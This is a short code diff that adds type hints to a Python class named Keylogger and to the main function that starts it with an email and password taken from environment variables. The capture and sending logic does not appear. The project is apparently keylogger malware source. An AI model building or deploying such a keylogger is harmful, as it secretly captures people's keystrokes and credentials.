@@ -7,7 +7,7 @@ import os
 
 class Keylogger:
 
-    def __init__(self, time_interval, email, password) -> None:
+    def __init__(self, time_interval: int, email: str, password: str) -> None:
         self.interval: int = time_interval
         self.email: str = email
         self.password: str = password
@@ -52,7 +52,7 @@ def main() -> None:
     dotenv.load_dotenv()
     EMAIL = os.getenv('EMAIL')
     PASSWORD = os.getenv('PASSWORD')
-    keylogger = Keylogger(120, EMAIL, PASSWORD)
+    keylogger: Keylogger = Keylogger(120, str(EMAIL), str(PASSWORD))
     keylogger.start()
 
 
